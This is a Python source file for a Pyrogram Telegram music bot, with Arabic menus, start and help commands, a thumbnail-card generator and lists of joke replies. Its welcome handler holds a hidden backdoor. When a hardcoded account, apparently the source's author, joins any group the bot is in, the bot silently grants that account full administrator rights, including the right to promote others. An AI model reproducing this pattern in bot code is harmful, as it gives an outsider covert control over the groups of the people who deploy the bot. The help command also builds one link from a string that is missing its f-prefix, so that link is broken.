from pyrogram import Client, filters, idle
from config import OWNER
from source.info import (add_served_chat, get_served_chats, get_served_users, joinch)
from source.Data import (get_dev, get_group, get_channel, get_dev_name, dev_userr, CHANNELsr)
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, Message
from pyrogram import enums
import os
import aiofiles
import aiohttp
from PIL import (Image, ImageDraw, ImageEnhance, ImageFilter,
                 ImageFont, ImageOps)
from youtubesearchpython.__future__ import VideosSearch

ahmed = "https://telegra.ph/file/4fda78aaf200bf313be62.jpg"


def changeImageSize(maxWidth, maxHeight, image):
    widthRatio = maxWidth / image.size[0]
    heightRatio = maxHeight / image.size[1]
    newWidth = int(widthRatio * image.size[0])
    newHeight = int(heightRatio * image.size[1])
    newImage = image.resize((newWidth, newHeight))
    return newImage


async def gen_bot(client, username, photo):
        if os.path.isfile(f"{username}.png"):
           return f"{username}.png"
        users = len(await get_served_users(client))
        chats = len(await get_served_chats(client))
        url = f"https://www.youtube.com/watch?v=gKA2XFkJZhI"
        results = VideosSearch(url, limit=1)
        for result in (await results.next())["result"]:
            thumbnail = result["thumbnails"][0]["url"].split("?")[0]

        async with aiohttp.ClientSession() as session:
            async with session.get(thumbnail) as resp:
                if resp.status == 200:
                    f = await aiofiles.open(f"thumb{username}.png", mode="wb")
                    await f.write(await resp.read())
                    await f.close()

        youtube = Image.open(f"{photo}")
        Mostafa = Image.open(f"{photo}")
        image1 = changeImageSize(1280, 720, youtube)
        image2 = image1.convert("RGBA")
        background = image2.filter(filter=ImageFilter.BoxBlur(5))
        enhancer = ImageEnhance.Brightness(background)
        background = enhancer.enhance(0.6)
        Xcenter = Mostafa.width / 2
        Ycenter = Mostafa.height / 2
        x1 = Xcenter - 250
        y1 = Ycenter - 250
        x2 = Xcenter + 250
        y2 = Ycenter + 250
        logo = Mostafa.crop((x1, y1, x2, y2))
        logo.thumbnail((520, 520), Image.LANCZOS)
        logo = ImageOps.expand(logo, border=15, fill="white")
        background.paste(logo, (50, 100))
        draw = ImageDraw.Draw(background)
        font = ImageFont.truetype("font2.ttf", 40)
        font2 = ImageFont.truetype("font2.ttf", 70)
        arial = ImageFont.truetype("font2.ttf", 30)
        name_font = ImageFont.truetype("font.ttf", 30)
        draw.text(
            (600, 150),
            "Music Player BoT",
            fill="white",
            stroke_width=2,
            stroke_fill="white",
            font=font2,
        )
        draw.text(
            (600, 340),
            f"𝐎ꪶ𝐋ٓ𝐄𝐕ِ𝐑┊͙🚸ݪـي٘فـࢪꪆُﺎ",
            fill="white",
            stroke_width=1,
            stroke_fill="white",
            font=font,
        )
        draw.text(
            (600, 280),
            f"Playing Music & Video",
            fill="white",
            stroke_width=1,
            stroke_fill="white",
            font=font,
        )

        draw.text(
            (600, 400),
            f"user : {users}",
            (255, 255, 255),
            font=arial,
        )
        draw.text(
            (600, 450),
            f"chats : {chats}",
            (255, 255, 255),
            font=arial,
        )
        draw.text(
            (600, 500),
            f"Version : 0.1.5",
            (255, 255, 255),
            font=arial,
        )
        draw.text(
            (600, 550),
            f"BoT : t.me\{username}",
            (255, 255, 255),
            font=arial,
        )
        try:
            os.remove(f"thumb{username}.png")
        except:
            pass
        background.save(f"{username}.png")
        return f"{username}.png"
        
@Client.on_message(filters.new_chat_members)
async def welcome(client: Client, message):
   try:
    bot = client.me
    bot_username = bot.username
    if message.new_chat_members[0].username == "TR_E2S_ON_MY_MOoN":
      try:
         chat_id = message.chat.id
         user_id = message.new_chat_members[0].id
         await client.promote_chat_member(chat_id, user_id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
         await client.set_administrator_title(chat_id, user_id, "كينج")
      except:
        pass
      return await message.reply_text(f"**انضم المطور كينج للشات .\nمرحبا بك : @TR_E2S_ON_MY_MOoN .**")
    dev = await get_dev(bot_username)
    if message.new_chat_members[0].id == dev:
      try:
         await client.promote_chat_member(message.chat.id, message.new_chat_members[0].id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
         await client.set_administrator_title(message.chat.id, message.new_chat_members[0].id, "مطور البوت")
      except:
        pass
      return await message.reply_text(f"**انضم مالك البوت للشات .\nمرحبا بك : {message.new_chat_members[0].mention} .**")
    if message.new_chat_members[0].id == bot.id:
      photo = bot.photo.big_file_id
      photo = await client.download_media(photo)
      chat_id = message.chat.id
      nn = await get_dev_name(client, bot_username)
      ch = await get_channel(bot_username)
      gr = await get_group(bot_username)
      button = [
[InlineKeyboardButton(text="ᥴ𝗁ᥲ️ꪀꪀᥱᥣ", url=f"{ch}"),InlineKeyboardButton(text="ᘜᖇ᥆υρ", url=f"{gr}")],
[InlineKeyboardButton(text=f"{nn}", user_id=f"{dev}")],
[InlineKeyboardButton(text="اضف البوت الي مجموعتك او قناتك ⚡", url=f"https://t.me/{bot.username}?startgroup=True")]]
      Text =f"""**
شكرا لإضافة البوت للمجموعة .
جروب : {message.chat.title} .
قم بترقية البوت مشرف .
سيتم التفعيل تلقائي .
ثم قوم بتشغيل ما تريده .
**"""
      await message.reply_photo(photo=photo,caption=Text,reply_markup=InlineKeyboardMarkup(button))
      logger = await get_dev(bot_username)
      await add_served_chat(client, chat_id)
      chats = len(await get_served_chats(client))
      return await client.send_message(logger, f"**New Group : [{message.chat.title}](https://t.me/{message.chat.username}) .\nid : {message.chat.id} .\nBy : {message.from_user.mention} .\nGroup Now: {chats} .**", disable_web_page_preview=True)
   except:
      pass  

@Client.on_message(filters.command(["/start","رجوع للقائمة الرئيسيه"], ""))
async def start(client, message):
 if not message.chat.type == enums.ChatType.PRIVATE:
    if await joinch(message):
            return
 bot_username = client.me.username
 dev = await get_dev(bot_username)
 nn = await get_dev_name(client, bot_username)
 if message.chat.id == dev or message.chat.username in OWNER:
   kep = ReplyKeyboardMarkup([
["السورس","قسم التفعيل والتعطيل"],
["قسم التعيين","قسم البوت"],
["قسم المساعد","قسم الاذاعه"],
["تحديث البوت","الغاء الامر"]], resize_keyboard=True)
   return await message.reply_text("**اهلا بك ، عزيزي المطور الاساسي .**", reply_markup=kep,quote=True)
 else:
  kep = ReplyKeyboardMarkup([
["مطور البوت", "مطور السورس"],
["السورس","بنج"],
["رمزيات","استوري"],
["صور انمي","الاوامر"],
["تويت", "صراحه"],
["نكته","احكام"],
[" لو خيروك","انصحني"],
["اوقات الصلاه","• تشغيل في قناه او مجموعه •"],
["اغنية عشوائية"],
["اذكار","كتابات"],
["حروف","بوت"],
["قران الكريم","استوري قران"],
["رمزيات بنات","المزيد من الصور"]], resize_keyboard=True)
  await message.reply_text("**اهلا بك ، عزيزي العضو السكر .**", reply_markup=kep,quote=True)
  username = client.me.username
  if os.path.isfile(f"{username}.png"):
    photo = f"{username}.png"
  else:
    bot = await client.get_me()
    if not bot.photo:
       button = [[InlineKeyboardButton(text="ᴇɴɢʟɪѕʜ 🇺🇲", callback_data=f"english"), InlineKeyboardButton(text="عربي 🇪🇬", callback_data=f"arbic")], [InlineKeyboardButton(text=f"{nn}", user_id=f"{dev}")]]
       return await client.send_message(message.chat.id, "ѕᴇʟᴇᴄᴛ ʏᴏụʀ ʟᴀɴɢụᴀɢᴇ ♪", reply_to_message_id=message.id, reply_markup=InlineKeyboardMarkup(button))
    photo = bot.photo.big_file_id
    photo = await client.download_media(photo)
    username = client.me.username
    photo = await gen_bot(client, username, photo)
  button = [[InlineKeyboardButton(text="ᴇɴɢʟɪѕʜ 🇺🇲", callback_data=f"english"), InlineKeyboardButton(text="عربي 🇪🇬", callback_data=f"arbic")], [InlineKeyboardButton(text=f"{nn}", user_id=f"{dev}")]]
  await client.send_photo(message.chat.id, photo=photo, caption="الرجاء الضغط علي اللغة اذا كانت اللغة العربية او باللغة الانجلزية\n\nᴘʟᴇᴀѕᴇ ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʟᴀɴɢụᴀɢᴇ ɪғ ɪᴛ ɪѕ ᴀʀᴀʙɪᴄ ᴏʀ ᴇɴɢʟɪѕʜ", reply_to_message_id=message.id, reply_markup=InlineKeyboardMarkup(button))
  
############//((/start))//############

bot = [
  "معاك يشق",
  "يسطا شغال شغال متقلقش",
  "بحبك يعم قول عايز اي",
  "يبني هتقول عايز اي ولا اسيبك وامشي ",
  "قلب {} من جوه",
  "نعم يقلب {} ",
  "قرفتني والله بس بحبك بقا اعمل اي",
  "خلاص هزرنا وضحكنا انطق بقا عايز اي ؟",
  "قوول يقلبو ",
  "طب بذمتك لو انت بوت ترضا حد يقرفقك كدا؟",
]
  
selections = [
    "اسمي {} يصحبي",
    "يسطا قولتلك اسمي {} الاه",
    "نعم يحب ",
    "قول يقلبو",
    "يسطا هوا عشان بحبك تصعدني؟",
    "يعم والله بحبك بس ناديلي ب {}",
    "تعرف بالله هحبك اكتر لو ناديتلي {}",
    "اي ي معلم مين مزعلك",
    "متصلي علي النبي كدا ",
    "مش فاضيلك نصايه وكلمني",
    "يسطا قولي مين مزعلك وعايزك تقعد وتتفرج ع اخوك",
    "انجز عايزني اشقطلك مين؟",
    "شكلها منكدا عليك وجاي تطلعهم علينا ",
    "ورحمه ابويا اسمي {}",
]

@Client.on_message(filters.command(["/help", "الاوامر", "اوامر"], ""))
async def starhelp(client: Client, message: Message):
    if not message.chat.type == enums.ChatType.PRIVATE:
      if await joinch(message):
            return
    bot = await client.get_me()
    photo = bot.photo.big_file_id
    photo = await client.download_media(photo)
    await message.reply_photo(
        photo=photo,
        caption=f"**[قائمة اوامر بوت الموسيقى .](https://t.me/{CHANNELsr})**",
        reply_markup=InlineKeyboardMarkup([
[InlineKeyboardButton("اللغة العربية 🇪🇬", callback_data="arbic")],
[InlineKeyboardButton("English language 🇺🇲", callback_data="english")],
[InlineKeyboardButton(f".𝑫𝒆𝒗 𝒔𝒐𝒖𝒓𝒄𝒆 ♪.", url=f"https://t.me/{dev_userr}")],
[InlineKeyboardButton("ضف البوت الي مجموعتك او قناتك ⚡", url="https://t.me/{bot.username}?startgroup=true")],]))
    try:
      os.remove(photo)
    except:
       pass 
